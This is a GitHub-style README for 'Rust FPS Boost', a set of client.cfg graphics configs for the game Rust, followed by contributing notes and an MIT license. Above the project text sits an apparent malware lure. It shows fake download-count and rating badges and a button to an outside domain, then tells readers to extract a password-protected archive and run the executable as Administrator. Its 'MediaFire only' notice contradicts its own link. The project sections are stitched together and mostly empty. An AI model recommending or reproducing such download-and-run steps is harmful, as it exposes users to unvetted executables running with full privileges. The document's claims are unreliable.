<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

# Rust FPS Boost

**More FPS in Rust on low-end PCs, and every setting tells you why.**

The best Rust settings for your graphics card, as documented `client.cfg` configs for **Rust (the Facepunch game)**.<br>
4 profiles from potato PC to RTX, 16 per-GPU configs, a one-click installer with backup.<br>
No placebo tweaks, no launch-option myths, no copy-pasted folklore.

## Free FPS fixes outside the config

These come straight from Facepunch, and no config can do them for you:

## Find your card

Click your card to open its config, or a profile to open that profile. Pick the profile for your screen resolution; the card file adds a few card-specific tweaks on top. **Why?** explains every value. `install.bat` picks all of this for you.

<!-- readme-cards:start -->
#### NVIDIA GeForce

| Card | VRAM | 1080p | 1440p | |
|---|---|---|---|---|
#### AMD Radeon

| Card | VRAM | 1080p | 1440p | |
|---|---|---|---|---|
## Profiles

| Profile | Built for | Goal |
|---|---|---|
## Safety

- The configs contain only console variables (convars) that Rust itself writes to `cfg\client.cfg`, the same file the in-game Options menu saves to.
- Nothing is injected, no game files or memory are modified, and the installer refuses to run while Rust is open.
## FAQ

<details>
<summary><b>Did it work?</b></summary>

In Rust press **F1**, type `graphics.drawdistance` and press Enter. It should show the profile's value (1500 on `low`).
</details>

<details>
<summary><b>My settings went back to normal.</b></summary>

Picking a preset in Rust's Graphics menu overwrites these values, and big game updates can too. Quit Rust and run `install.bat` again.
</details>

<details>
<summary><b>How do I undo it?</b></summary>

`install.bat` → **3** (undo the last install) or **4** (your config from before the first install). Backups live next to your config in `Rust\cfg\`.
</details>

<details>
<summary><b>Will this give me 2× FPS?</b></summary>

## Documentation

| | |
|---|---|


---

# Contributing

Thanks for helping. The bar for changes is simple: **every value needs a reason, and every claim needs to be honest about its evidence.**

## Changing a profile value

1. Change the value in `profiles/*.cfg` (keep the key order identical across all profiles).
## Before you open a PR

```bash
python tools/validate.py         # profiles/overlays only use real convars, same key order
python tools/gen_cards.py --check  # generated card files are up to date
```

CI runs both on every push.

## After a game update

Rust updates monthly and convars sometimes get renamed or removed. After a major update:

1. Launch the game, quit, and diff your new `client.cfg` keys against `reference/client.dump.cfg`.
2. Open an issue or PR listing renamed/removed convars.


---

MIT License

Copyright (c) 2026 Rust FPS Boost contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
